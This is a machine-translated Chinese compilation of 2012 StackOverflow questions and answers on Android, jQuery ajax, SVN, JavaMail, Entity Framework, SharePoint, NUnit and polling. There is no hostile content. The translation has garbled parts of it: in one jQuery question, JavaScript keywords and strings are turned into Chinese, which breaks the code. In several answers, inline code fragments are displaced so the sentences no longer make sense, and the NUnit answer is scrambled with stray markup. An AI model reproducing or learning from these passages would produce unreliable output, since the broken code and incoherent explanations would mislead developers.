# StackOverflow 问答 11866000-11866999

# android - Android、Windows Metro 应用程序和 Windows 桌面

> ID：11866000
> 
> 赞同：-3
> 
> 时间：2012-08-08T13:50:42.420
> 
> 标签：android, windows, windows-8

大家好，感谢您查看此问题:)

我是一名**独立的开发人员**，想为安卓、Windows 8 桌面和 Metro 开发应用程序。

在阅读了很多论坛和博客之后，我相信也许要做出最好看（原生感觉）的应用程序，我必须学习

1.  适用于 Android 的 Java
2.  Metro 的 HTML、CSS 和 JS
3.  Windows 桌面的其他内容

我需要您的帮助是，是否有任何**一种特定的语言**可以让我开始使用它来让我的旅程变得更好？

通过应用程序，我的意思是与**共享和传输文件有关。**

**PS 阅读 Python 可能是完美的！**

你同意 ？请提出一些建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:22:53.207

如果您想要最高级别的跨平台兼容性，最好使用 Web 应用程序（通常是 HTML、CSS 和 JS）。制作 Web 应用程序将有助于确保您的应用程序几乎可以在所有带有 Web 浏览器的设备上运行，并且您只需要维护一个代码库。

权衡是您经常会丢失一些功能，例如使用手机的某些传感器。

如果您想为每个应用程序制作本机应用程序，那么我建议您使用 Java（尤其适用于 Android）或 C/C++（尤其适用于桌面环境）。Python 也是一种优秀的入门语言（[codeacademy](http://codeacademy.com)有一些很棒的教程），但它不像 Java 或 C/C++ 那样直接适用于应用程序开发。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:59:03.867

正如 Tanis 所暗示的那样，您需要根据“丰富的功能与最大的覆盖范围”来确定您的目标在哪里 - 并且根据您的“最佳外观（原生感觉）”评论，我会说您倾向于“富有的”

由于浏览器无处不在，纯 HTML5/CSS/JavaScript 将为您提供最大的影响力，但您仍然可以使用 HTML5/CSS/JS进行现代 Windows 8 应用程序的*本地*开发，并通过[PhoneGap](http://phonegap.com/)开发 Android 和其他移动设备。拥有一个代码库并在这些平台上支持本机功能即使不是不可能，也是很困难的，但是通过正确的设计和架构，您应该能够大量重用您的 HTML/CSS/JS 资产。

由于您也提到了 Windows 桌面，因此另一个选择是将 WPF 和 XAML 与 C# 一起使用。您可以使用它构建本机 Windows 桌面应用程序，这些相同的技术 (XAML/C#) 是现代 Windows 8 (nee Metro) 应用程序的三个主要开发选项之一（以及 HTML5/JS 和 C++/XAML）。对于其中的 Android 部分，Xamarin 的[Mono for Android](http://xamarin.com/monoforandroid)允许您重用许多 C#/.NET 资产来将本机应用程序部署到 Android（它们还具有[MonoTouch](http://xamarin.com/monotouch)以将 iOS 添加到您的武器库中！）

至于 Python，它是一种高效且强大的语言，非常适合后端服务——比如用于共享和传输文件的管道——但它不是我构建移动应用程序的首选工具。

# android - 停止活动，直到我从 AlertDialog 获得结果

> ID：11866001
> 
> 赞同：0
> 
> 时间：2012-08-08T13:50:45.823
> 
> 标签：android

这是我的问题 - 我想创建一个活动和一个对话框（带有文本字段和确定按钮）。我想做以下事情：

1.  显示 AlertDialog（在创建活动、单击按钮或其他一些操作时）；
2.  在 AlertDialog 中填写文本，然后单击 OK 按钮；
3.  继续做activity的主线程；

像这样的东西：

```
public String getText() {

    String result = null;

    // Showing the new window with the text box and the button, and after
    // the button is clicked to move to the return statement below;

    return result;
} 
```

我尝试使用“runOnUiThread”和“AsyncTask”，但“result”字段上的操作仅在“protected void onPostExecute(Void result)”方法中完成，同时主程序仍在执行，无需等待我的输入.

无论如何要这样做（我相信它有，因为看到了这样的应用程序）来解决这个问题？我知道寻求这样的帮助真的很无礼 - 但是可以编写一些代码示例，看看它是如何真正发生的，因为超过 3 天，我做不到。如果没有，请提供一些建议，并将继续尝试和尝试:) 非常感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T15:03:33.853

无论你想在点击后执行什么操作，都写在 asynctask 中。当点击对话框按钮时执行 asynctask。就是这样

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:07:08.687

好吧，这几乎就是对话框的工作方式。

[http://developer.android.com/guide/topics/ui/dialogs.html#CustomDialog](http://developer.android.com/guide/topics/ui/dialogs.html#CustomDialog)

在底部，它显示了如何创建自定义对话框。

但是，很多时候你需要输入的文本也会显示在活动中，你能不能在你的活动中嵌入一个 EditText 并简化这个任务？

# javascript - 提交表单会触发一个 ajax 调用，该调用会在成功时发布到操作页面

> ID：11866006
> 
> 赞同：1
> 
> 时间：2012-08-08T13:51:02.443
> 
> 标签：javascript, jquery, ajax

我有一个带有用户名和密码的登录表单。我与用户一起向 Web 服务发帖并作为参数传递，然后我取回该用户的 ID。

我想要实现的是，在提交表单时，会进行 ajax 调用，然后再填充 ID 字段（我需要），然后使用`$('#form1').post();`.

为了防止默认行为，我在事件`return false;`开始时有一个。`.submit()`

```
$('#form1').submit(function() {         
        $('#sajax-loader').show();        
        $.ajax({
            类型：“发布”，
            contentType: "应用程序/json; charset=utf-8",
            数据：'{user:"' + $("#user").val() + '",pass:"' + $("#pass").val() + '"}',
            url: "URL.asmx/validate",
            数据类型：“json”，
            成功：函数（数据）{
                $('#id').val(data.d);                
                $('#sajax-loader').hide();                                             
                $('#form1').post();
                $('#login-notification').show();                                
            },
            错误：函数（错误）{
                $('#login-notification').html("发生错误" + err);
            }
        });
        返回假；
    });

```

显然这是错误的方法，因为我在提交时没有得到任何响应。

有人可以指导我正确的方向吗？就如何调整我在这里的提交功能给出一些建议，或者可能是一种完全不同的更实用的方法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T13:51:54.237

开始将在您和其余代码未执行的那一点`return false`停止函数的执行。所以，把你放在最后。`submit()``return``return false`

换句话说，使用**[.preventDefault()](http://api.jquery.com/event.preventDefault)**将停止默认的表单提交行为。

```
$('#form1').submit(function(e) { 

        // instead of return false
        // use e.preventDefault()           

        e.preventDefault();
        $('#sajax-loader').show();        
        $.ajax({
            type: "POST",
            contentType: "application/json; charset=utf-8",
            data: '{user:"' + $("#user").val() + '",pass:"' + $("#pass").val() + '"}',
            url: "URL.asmx/validate",
            dataType: "json",
            success: function (data) {
                $('#id').val(data.d);                
                $('#sajax-loader').hide();                                             
                $('#form1').post();
                $('#login-notification').show();                                
            },
            error: function (err) {
                $('#login-notification').html("An Error Occured " + err);
            }
        });
    }); 
```

### 还有一件事

代替

`data: '{user:"' + $("#user").val() + '",pass:"' + $("#pass").val() + '"}',`

您可以使用：

`data: {user: $("#user").val() ,pass: $("#pass").val() },`

# unit-testing - .NET CF UnitTesting with emulator - 测试运行错误

> ID：11866011
> 
> 赞同：5
> 
> 时间：2012-08-08T13:51:28.770
> 
> 标签：unit-testing, compact-framework

试运行错误：

执行此测试所需的测试适配器（'Microsoft.VisualStudio.TestTools.TestTypes.Unit.UnitTestAdapter, Microsoft.VisualStudio.QualityTools.Tips.UnitTest.Adapter, Version=9.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'）可以不被加载。检查测试适配器是否安装正确。错误：智能设备主机适配器无法初始化。

实际情况：已知问题“辅助线程中的单元测试异常杀死 vstesthost”

已通过添加到 C:\Program Files\Microsoft Visual Studio 9.0\Common7\IDE\VSTestHost.exe.config 解决

以下行：

Microsoft.VisualStudio.SmartDevice.UnitTestFramework.dll 已添加到 GAC：

"C:\Program Files\Microsoft SDKs\Windows\v6.0A\bin\gacutil.exe" -i "C:\Program Files\Microsoft Visual Studio 9.0\Common7\IDE\PublicAssemblies\Microsoft.VisualStudio.SmartDevice.UnitTestFramework. dll"

但我仍然收到错误消息，无法在模拟器上运行单元测试。

或者这可能是 Visual Studio 2008 的未解决问题，我应该尝试其他工具/可能性？

![在此处输入图像描述](../Images/d7cb15f82b0de5e277d563e3cb8c1909.png)

System.IO.FileNotFoundException 未处理

系统找不到文件

Source="Device Connection Manager" StackTrace：在 Microsoft.VisualStudio.DeviceConnectivity.Interop.ConManServerClass.DownloadPackage(String pwszPackageId) 在 Microsoft.SmartDevice.Connectivity.FileDeployer.DownloadPackage(ObjectId packageId) 在 Microsoft.VisualStudio.SmartDevice.TestHostAdapter.DeviceAgent。 RunConfigDevice.InitializeStreamingWithDevice() 在 Microsoft.VisualStudio.SmartDevice.TestHostAdapter.DeviceAgent.DeviceHostAdapter.initializeInternal() 在 System.Threading.ThreadHelper.ThreadStart_Context(Object state) 在 System.Threading.ExecutionContext.Run(ExecutionContext executionContext, ContextCallback callback, Object state ) 在 System.Threading.ThreadHelper.ThreadStart() 内部异常：

[http://img688.imageshack.us/img688/2025/20120808testrunerrorexc.gif](http://img688.imageshack.us/img688/2025/20120808testrunerrorexc.gif)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T17:41:40.547

如果您刚刚安装了移动设备的 SDK，它可能已经安装了尚未初始化的框架。尝试重新启动。

如果您安装了多个移动 SDK（WM5、WM6.1、WM6.3.5 等），请确保您的项目正在尝试启动您的目标版本。

如果一切都失败了，您可以尝试卸载模拟器，重新启动（因为我们喜欢 Windows），再次安装，重新启动（因为它仍然是 Windows），然后返回到您的项目。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T14:00:33.703

我在这里找到了答案：http: [//social.msdn.microsoft.com/Forums/en/vssmartdevicesvbcs/thread/72fbc539-cf28-4643-b7bf-2ced70018d2e](http://social.msdn.microsoft.com/Forums/en/vssmartdevicesvbcs/thread/72fbc539-cf28-4643-b7bf-2ced70018d2e)

> 也许不是最优雅的解决方案，但我只是将 SmartDevice.UnitTestFramework.dll 及其 xml 配置文件从 VS 2008 公共程序集文件夹复制到 VS 2010 公共程序集文件夹，它对我有用。

在我的机器上，这些文件夹是 VS2008

```
C:\Program Files (x86)\Microsoft Visual Studio 9.0\Common7\IDE\PublicAssemblies 
```

对于 VS2010

```
 C:\Program Files (x86)\Microsoft Visual Studio 10.0\Common7\IDE\PublicAssemblies 
```

我收到 2 条错误消息。vstesthost.exe 崩溃，并详细给出了这一行

```
vstesthost.exe
Microsoft.SmartDevice.Connectivity
System.IO.FileNotFoundException 
```

或者单元测试框架抛出这个异常

```
"The system cannot find the file specified.\r\n"
"Device Connection Manager"
at Microsoft.VisualStudio.DeviceConnectivity.Interop.ConManServerClass.DownloadPackage(String pwszPackageId)
at Microsoft.SmartDevice.Connectivity.FileDeployer.DownloadPackage(ObjectId packageId)
at Microsoft.VisualStudio.SmartDevice.TestHostAdapter.DeviceAgent.RunConfigDevice.InitializeStreamingWithDevice()
at Microsoft.VisualStudio.SmartDevice.TestHostAdapter.DeviceAgent.DeviceHostAdapter.initializeInternal()
at System.Threading.ThreadHelper.ThreadStart_Context(Object state)
at System.Threading.ExecutionContext.Run(ExecutionContext executionContext, ContextCallback callback, Object state)
at System.Threading.ThreadHelper.ThreadStart() 
```

# android - Android 中 java.lang.StringIndexOutOfBoundsException 的完整证明检查

> ID：11866012
> 
> 赞同：0
> 
> 时间：2012-08-08T13:51:31.923
> 
> 标签：android, null, android-asynctask, indexoutofboundsexception

在下面的代码中仍然出现*java.lang.StringIndexOutOfBoundsException: index=0 length=0*错误`if (result.charAt(0) =='Y')`

还有其他更好的方法来检查空字符串`if (result == null || result.isEmpty())`吗？由于某种原因，空字符串“result”没有被拾取或`activity.finish();`没有执行，并且下一个 if 语句被执行了？请提供任何帮助。

```
@Override
    protected void onPostExecute(String result) {

        //check if result null or empty
        if (result == null || result.isEmpty()) {

            Toast.makeText(context, "Could Not Check For Updates, Please Try Again. Closing Application.", Toast.LENGTH_LONG).show();
            activity.finish();
        }           
        //update available
        if (result.charAt(0) =='Y') {

            UpdateAlert();
        }
        //no update available
        else if (result.charAt(0) =='N') {

            Toast.makeText(context, "No Updates Available", Toast.LENGTH_SHORT).show();             
        }
        else {

            Toast.makeText(context, "Could Not Check For Updates, Please Try Again. Closing Application : " + result, Toast.LENGTH_LONG).show();
            activity.finish();
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T13:56:53.173

一旦遇到无效结果，请尝试从该方法返回，如下所示

```
//check if result null or empty         
           if (result == null || result.isEmpty()) {              
                Toast.makeText(context, "Could Not Check For Updates, Please Try Again. Closing Application.", Toast.LENGTH_LONG).show();             
                activity.finish();         
                return;
           } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T13:57:07.477

```
 if (result == null || result.trim().length()==0) {
         Toast.makeText(context, "Could Not Check For Updates, Please Try Again. Closing  Application.", Toast.LENGTH_LONG).show();
            activity.finish();
        }           
        //update available
        else if (result.charAt(0) =='Y') {
        ^^^^ 
            UpdateAlert();
        } 
```

# svn - SVN 导出 - 覆盖文件但不删除目录

> ID：11866014
> 
> 赞同：1
> 
> 时间：2012-08-08T13:51:33.607
> 
> 标签：svn, deployment

我们在包含相同子目录结构的 SVN 存储库中有 2 个目录。作为我们（原始）部署脚本的一部分，我们将第一个 svn 导出到本地目录，然后将第二个 svn 导出到同一个本地目录：

```
repo/project/trunk/dir1/
repo/project/trunk/dir1/a/
repo/project/trunk/dir1/a/foo.txt

repo/project/trunk/dir2/
repo/project/trunk/dir2/a/
repo/project/trunk/dir2/a/foo.txt 
```

在我们的场景中，dir1 是一些文件的生产版本，而 dir2 和对那些尚未由开发团队发布的文件的待定更改。因此，我们希望 svn export 覆盖磁盘上的文件。

svn export 不会填充现有目录；--force 标志是必需的。svn export --force 不会填充现有目录，它会完全*重新创建*目录。因此，我们的第二个 svn 导出破坏了 dir1 的本地导出，只剩下 dir2 的内容。

有什么方法可以让 svn export 做我们想做的事——从 dir1 获取文件，将它们放在本地目录中，然后将 dir2 的内容覆盖在 dir1 之上？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:09:18.573

我认为`svn export`不会允许这种行为。如果不使用实际的分支，是否可以使用`rsync`创建第三个“组合”目录？

这些方面的东西：

```
# export 'dir1' to 'production'
svn export repo/project/trunk/dir1 production
# export 'dir2' to 'development'
svn export repo/project/trunk/dir2 development

# sync contents from 'production' to 'combined'
rsync -a production/ combined
# sync contents from 'development' to 'combined'
rsync -a development/ combined 
```

# java - 带有 Lotus 服务器的 javaMail

> ID：11866015
> 
> 赞同：0
> 
> 时间：2012-08-08T13:51:35.007
> 
> 标签：java, jakarta-mail, lotus-domino

我面临 Lotus 服务器的一些问题。负责服务器的人告诉我配置没问题，但是我不能用他的 Lotus 服务器发送带有 html 正文的邮件。

我得到的错误是：“554 Relay 由于政策原因被拒绝。”</p>

当我在我的电脑上尝试时，我使用了 smpt.gmail.com 并且像冠军一样工作。所以我相信不是代码问题，问题在于服务器配置。

javaMail和Lotus有问题吗？这是一个普遍的问题吗？（在一个博客中，有人说无法发送 html，但我不敢相信）

我的代码以防万一，

```
public void sendEmail(String toEmailAddr, String subject, String issue) {
    Properties props = new Properties();
    props.put("mail.smtp.host", host);
    props.put("mail.smtp.port", port);

    Session mailSession = Session.getDefaultInstance(props);
    Message simpleMessage = new MimeMessage(mailSession);

    InternetAddress toAddress = null;
    InternetAddress toAddress2[] = null;
    Transport t = null ;    

    try {
        Multipart mp = new MimeMultipart();
        MimeBodyPart htmlPart = new MimeBodyPart();
        htmlPart.setContent(issue, "text/html");
        mp.addBodyPart(htmlPart);
        simpleMessage.setContent(mp);
    } catch (MessagingException e1) {
        // TODO Auto-generated catch block
        e1.printStackTrace();
    }       
    try {
        toAddress = new InternetAddress(toEmailAddr);
        toAddress2 = new InternetAddress [1];
        toAddress2[0] = toAddress;          
    } catch (AddressException e) {
        // TODO LOG 
        e.printStackTrace();
    }
    try {
        simpleMessage.setRecipients(RecipientType.TO, toAddress2);
        simpleMessage.setSubject(subject);          
        t = mailSession.getTransport("smtp");       
        if(userPwd==null)
            userPwd = "";
        t.connect(host, userName, userPwd);
        t.sendMessage(simpleMessage, simpleMessage.getAllRecipients());
    } catch (MessagingException e) {
        e.printStackTrace();
        // TODO LOG 
    }finally{
        try {
            t.close();
        } catch (MessagingException e) {
            // TODO LOG 
        }
    }
} 
```

问候。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T14:38:06.690

Domino 服务器上的 SMTP 很可能已设置为仅允许某些主机进行中继 - 因此出现错误消息`554 Relay rejected for policy reasons`。

您应该与管理员交谈并让他更改配置以允许其他主机中继。这是在 Router/SMTP -> Restrictions and Controls -> SMTP Inbound Controls 部分的配置文档中配置的。有关 SMTP 入站中继控制的更多信息，请访问：http: [//publib.boulder.ibm.com/infocenter/domhelp/v8r0/index.jsp ?topic=%2Fcom.ibm.help.domino.admin.doc%2FDOC% 2FH_SETTING_INBOUND_RELAY_CONTROLS_STEPS.html](http://publib.boulder.ibm.com/infocenter/domhelp/v8r0/index.jsp?topic=%2Fcom.ibm.help.domino.admin.doc%2FDOC%2FH_SETTING_INBOUND_RELAY_CONTROLS_STEPS.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-17T14:11:27.790

我有同样的问题并解决了。FROM部分是“me@example.com”，改成“myname@mydomain.com”，开始发送

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-02-01T08:34:04.733

可能需要安全连接（SSL），使用以下属性连接支持 smtp 协议的邮件服务器：

```
 properties.put("mail.smtp.socketFactory.port", "SMTP_PORT");
    properties.put("mail.smtp.host", "SMTP_SERVER_HOST_NAME_OR_IP");
    properties.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
    properties.put("mail.smtp.socketFactory.fallback", "false"); 
```

# java - 公共摘要值得注意的例子

> ID：11866016
> 
> 赞同：0
> 
> 时间：2012-08-08T13:51:43.590
> 
> 标签：java, android, abstract-class, abstract

我正在通过 Repo 浏览 Github 上的 Reddit 应用程序。现在，对于对话框和他们选择添加的任务之间的链接：

```
public abstract void onLoginChosen(String user, String password); 
```

然后，他们有一个 Task 类来处理数据并生成和接收输入，然后将其解析到 UI。

我不明白，这个构造函数中的抽象是如何进入任务的。

那里的任务甚至没有扩展这个对话任务。

```
public class LoginTask extends AsyncTask<Void, Void, Boolean> {

    private static final String TAG = "LoginTask";

    protected String mUsername;
    private String mPassword;
    protected String mUserError = null;

    private RedditSettings mSettings;
    private HttpClient mClient;
    private Context mContext;

    protected LoginTask(String username, String password, RedditSettings settings, HttpClient client, Context context) {
        mUsername = username;
        mPassword = password;
        mSettings = settings;
        mClient = client;
        mContext = context;
    }

    @Override
    public Boolean doInBackground(Void... v) {
        return doLogin(mUsername, mPassword, mSettings, mClient, mContext);
    } 
```

在这个例子中，数据是如何从一个类转移到另一个类的？我被难住了，这让这部分变得容易理解。

[回购](https://github.com/talklittle/reddit-is-fun/tree/master/src/com/andrewshu/android/reddit/login)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:17:36.233

这里的 Activity 中有一个实现：

[https://github.com/talklittle/reddit-is-fun/blob/master/src/com/andrewshu/android/reddit/threads/ThreadsListActivity.java#L1220](https://github.com/talklittle/reddit-is-fun/blob/master/src/com/andrewshu/android/reddit/threads/ThreadsListActivity.java#L1220)

以及其他活动，其中可以显示登录对话框。

旁注：这是非常旧的代码，该应用程序的最新封闭源代码版本避免了这样的事情。

# c# - 为什么我需要 C# EF 中的 ID 和虚拟集合？

> ID：11866018
> 
> 赞同：1
> 
> 时间：2012-08-08T13:51:47.273
> 
> 标签：c#, entity-framework

我是一名 Java 人，我正在努力学习 .Net 领域。我正在学习的其中一件事是 EF4，我注意到了这个有趣的事情。当您声明一个与另一个实体具有 1:n 关系的实体时，您必须执行以下操作：

```
public int CategoryId { get; set; }
public virtual Category Category { get; set; } 
```

我的问题是：

> 框架需要两个声明是否有充分的理由？

在 Java 世界中，该框架足够智能，可以确定主键是什么，并将该记录添加到 DB 中，而不必在实体类上具有单独的字段。为什么.Net 没有在这个小而烦人的问题上效仿？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T13:56:37.043

你不必那样做。事实上你不应该因为你可以让你的对象处于不一致的状态。假设您有：

```
public class Category {
    public Int32 Id { get; set; }
}

public class SomeClass {
    public Int32 Id { get; set; }
    public virtual Category Category { get; set; }
} 
```

这是有效的。您只需要在其配置中告诉 EF 如何找到外键。基于以上内容，它将尝试使用`SomeClass.Category_Id`，但您可以随意更改它。

**编辑**：如果要更改外键，可以通过添加配置类并在`OnModelCreating`事件期间添加它来实现：

```
internal class ForSomeClassEntities : EntityTypeConfiguration<SomeClass> {
    public ForSomeClassEntities(String schemaName) {
        this.HasRequired(e => e.Category)
            .WithMany()
            .Map(map => map.MapKey("CategoryId"));
        this.ToTable("SomeClass", schemaName);
    }
} 
```

在您的覆盖`Context`类中：

```
protected override void OnModelCreating(DbModelBuilder modelBuilder) {
    base.OnModelCreating(modelBuilder);

    modelBuilder.Configurations
        .Add(new ForSomeClassEntities("SomeSchema"))
        ;
} 
```

使用上面相同的类会告诉 EF 寻找一个被调用的外键属性`SomeClass.CategoryId`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-04-05T16:25:27.163

当您向模型添加虚拟集合/模型时，**实体框架会自动** `<ClassName>Id` **向其添加一个字段**。出于可读性目的，开发人员通常决定显式声明`<ClassName>Id`，以便其他开发人员明确知道它的存在（不依赖于配置的约定）。例如，教程就是这种情况，因为他们想让事情变得清晰。

实体框架足够聪明，可以使用`<ClassName>Id`已经显式声明的现有实体。因此，解决对该主题的其他响应，**它不会导致不一致的状态。**此外，从性能的角度来看，它仍然符合延迟加载模式，因为预加载`int`（在本例中为 ID）仍然非常快（甚至无法与预加载整个对象相比）。

# asp.net - SP2010 - httpcontext.response.write() 不适用于 LinkBut ton 的 onClick 事件

> ID：11866025
> 
> 赞同：2
> 
> 时间：2012-08-08T13:52:12.310
> 
> 标签：asp.net, sharepoint-2010, httpcontext

可能是我错过的一个简单的疏忽（尽管我隐约记得一些关于 Response.Write 内部运作的晦涩博客文章在某些情况下无法按预期工作，但我不记得这是否是其中之一）：

情况是，我在 SP2010 中运行的控件上有一个链接按钮，如果我不使用 HttpContext.Response.Write()，一切都会按预期工作（即我可以更改标签的 .Text 值）。但是，如果我调用 Context.Response.Write()，虽然我可以调试和单步执行代码，但似乎什么都没有发生（什么都没有写回，也没有出现对其他控件的更改）。它正在 _layouts 中的应用程序页面上运行，出现在模式对话框中。

（基本上，我正在尝试这样做 - [http://acveer.wordpress.com/2011/01/25/using-the-sharepoint-2010-modal-dialog/](http://acveer.wordpress.com/2011/01/25/using-the-sharepoint-2010-modal-dialog/)但它不起作用。编辑：如果我改成asp:Button，还是不行）

如果您有兴趣，这里有一些代码：

.aspx：

```
@ Page Language="C#" AutoEventWireup="true" ... 
<asp:LinkButton CssClass="button remove" runat="server" OnClick="remove_Click" Text="Remove" ID="remove"></asp:LinkButton> 
```

.aspx.cs：

```
 public void remove_Click(object sender, EventArgs e)
    {
        ....

        //if successful
        HttpContext context = HttpContext.Current;
        if (HttpContext.Current.Request.QueryString["IsDlg"] != null)
        {
            testControl.Text = "test code";

            //doesn't work, and prevents line above from working
            Context.Response.Write("<script type='text/javascript'>alert('hi!');</script>");
            Context.Response.Flush();
            Context.Response.End();

           // context.Response.Write("<script type='text/javascript'>window.frameElement.commitPopup()</script>");
           // context.Response.Flush();
           // context.Response.End();
        }           
    } 
```

有人遇到过类似的事情吗？

编辑：一些更有趣的作品可能会有所帮助，

*   按钮本身位于 UpdatePanel 中
*   我确实分配了 AsyncPostbackTrigger

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T15:05:47.623

从后面的 Web 表单代码中使用 Response.Write 充其量是有问题的。根据经验：永远不要从 Web 表单页面或用户控件中使用 Response.Write。

Response.Write 存在问题的原因是它不是页面控制树和渲染基础设施的一部分。这意味着当在事件中使用时，它将在正常页面流之外输出文本，并且通常在正确的 HTML 页面结构之外。

这也是当您将它们与 UpdatePanel 结合使用时出现问题的原因。由于 UpdatePanel 是专门为替换页面中的部分而设计的，因此基础架构需要知道*哪些*部分。Response.Write 完全在此之外发生，并且没有真正的方法知道在哪里呈现它。最好的情况是，ScriptManager 会执行一个 Response.Clear 来清除您的 Response.Writes，最坏的情况是您会破坏 UpdatePanel 协议主体并且您会收到一个 JavaScript 错误。

`<script>`最重要的是，当您执行部分页面更新时，任何文字标记都将被忽略，因为`innerHTML`用于填充服务器发送的 HTML 片段的浏览器功能不会执行`<script>`标记。

现在，抛开所有这些理论——没有办法通过 UpdatePanel 执行一段 JavaScript 代码吗？事实证明，它比仅仅执行 Response.Write: **ScriptManager.RegisterClientScriptBlock**和**ScriptManager.RegisterStartupScript**干净得多。例如：

```
ScriptManager.RegisterClientScriptBlock(
    theButton, // control or UpdatePanel that will be rendered
    typeof(YourPage), "UniqueKey", // makes your script uniquely identifiable
    "alert('Testing!');", true); 
```

重要的部分是第一个参数：现在 ScriptManager 将知道何时执行您的脚本。如果在部分页面刷新时未更新的控件上注册它，您的脚本将不会执行。但是，如果刷新了包含控件的 UpdatePanel *，*则连接到它的脚本也将执行。这通常正是您想要的。

如果你总是想执行你的脚本，无论哪个面板更新，你都会调用

```
ScriptManager.RegisterClientScriptBlock(Page, ... ); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-08T15:15:12.533

@Ruben 提供了一个很好的答案，但我觉得我可以添加不适合评论的有用内容。

在 SharePoint 中有几个使用 Response.Write 的场合 - 即在处理显示在 SharePoint 模态弹出窗口中的 web 部件时，您希望在使用`window.frameElement.commitPopup()`.

您在更新面板中使用 Response.Write 的事实实际上是您的问题的一部分。当使用更新面板生成的回发返回时，响应的格式为与更新面板关联的 div`UpdatePanelId|Response Content`所在的位置，并且是该 div的新内部 HTML。当您使用 response.write 时，该格式会丢失，因此 ScriptManager 不知道如何处理响应并应将其视为错误而忽略。@Ruben 为您提供了一种在 UpdatePanel 中注册脚本的方法。`UpdatePanelId``Response Content`

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-08T13:53:59.520

Context.Response... 应该有一个小写的上下文

IE：

```
context.Response.Flush() 
```

ETC

还是我错过了重点？

# c# - 使用 NUnit 进行单元测试。空对象错误

> ID：11866026
> 
> 赞同：0
> 
> 时间：2012-08-08T13:52:18.990
> 
> 标签：c#, c#-4.0, nunit, moq

当我运行我的一个单元测试时，我不断收到一个空对象引用错误。

单元测试：

```
 [Test]
    public void EnumeratedData_ValidInputType_NoErrorAdded()
    {
        List<String> errorMessageList = new List<string>();
        UserInputEntity myEntity = new UserInputEntity();

        myEntity.DataTypes = new List<string>();
        myEntity.DataTypes.Add("DateTime");
        myEntity.DataTypes.Add("datetime");
        myEntity.DataTypes.Add("decimal");
        myEntity.DataTypes.Add("decIMAL");
        myEntity.DataTypes.Add("DOUble");
        myEntity.DataTypes.Add("double");
        myEntity.DataTypes.Add("FLOat");
        myEntity.DataTypes.Add("float");
        myEntity.DataTypes.Add("INT");
        myEntity.DataTypes.Add("int");

        PathReader reader = new PathReader();
        IOManager manager = new IOManager(reader);
        VerificationManager testObject = new VerificationManager(manager);

        testObject.EnumeratedDataTypes(myEntity, errorMessageList);
        Assert.AreEqual(errorMessageList.Count, 0);
    } 
```

方法代码：

```
 public void EnumeratedDataTypes(UserInputEntity inputs, List<String> errorMessageList)
    {
        inputs.EnumeratedDataTypes = new int[inputs.DataTypes.Count];
        try
        {
            for (int i = 0; i < inputs.DataTypes.Count; i++)
            {
                inputs.EnumeratedDataTypes[i] = (int)Enum.Parse(typeof(Enumerations.ColumnDataTypes), inputs.DataTypes[i].ToUpper());
            }
        }
        catch (Exception ex)
        {
            errorMessageList.Add(ex.Message);
        }
    } 
```

枚举：

```
class Enumerations
{
    public enum ColumnDataTypes
    {
        DATETIME = 0,
        DECIMAL = 1,
        DOUBLE = 2,
        FLOAT = 3,
        INT = 4
    }
} 
```

错误信息：

> FrazerMann.CsvImporter.Entity.Test.EntityVerificationTests.EnumeratedData_ValidInputType_NoErrorAdded：System.NullReferenceException：对象引用未设置为对象的实例。

我假设我忽略了一些愚蠢简单的东西，但我看不到它。如果有人能让我摆脱痛苦，我将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:37:08.990

在您的`EnumeratedDataTypes`方法中，您首先将`inputs.EnumeratedDataTypes`属性的长度设置为，因为它尚未填充数据（它只是已设置为的*容量*`inputs.ColumnNames.Count`），因此等于。`0``List` *`9`*

 *`0`接下来，当用您循环到索引（包括）的数据填充此数组属性时`inputs.DataTypes.Count`：

```
for (int i = 0; i <= inputs.DataTypes.Count; i++) 
```

我将`input.DataTypes`列表的大小计算为`10`. 因此，您将尝试将数据写入空数组。

我建议进行以下更改：

***首先***，初始化`inputs.EnumeratedDataTypes`数组如下：

```
inputs.EnumeratedDataTypes = new int[inputs.DataTypes.Count]; 
```

***其次***，在循环使用`<`而不是`<=``for`

```
for (int i = 0; i < inputs.DataTypes.Count; i++) 
```*

# javascript - 我们是否需要 setTimeout 进行短轮询？

> ID：11866027
> 
> 赞同：2
> 
> 时间：2012-08-08T13:52:24.217
> 
> 标签：javascript, jquery, polling

如果我想像这样实现短轮询：

```
function firstCall(){
   $.ajax({
     ...
     success: function(response){
         if (response.OK == "OK"){
              secondCall();
         }else{
            firstCall();
         }
     }
  });

} 
```

这够了吗？还是我真的需要用 包围`firstCall()`in else 子句`setTimeout`？谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-08T13:55:31.657

我建议您使用一点超时，因为现在您正在为服务器创建大量流量。Ajax 速度很快，并且`success`会经常执行。

所以我建议你改用*setTimeout*或*setInterval*！

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-08T14:00:01.020

此解决方案依赖于第一次调用才能成功。如果您的代码在任何时间点都没有“成功”（可能是服务器出现故障？），您的“轮询”将停止，直到页面刷新。

您可以使用`setInterval`在定义的时间间隔内调用该方法，从而避免此问题：

```
setInterval(function(){
    $.ajax({}); // Your ajax here
}, 1000); 
```

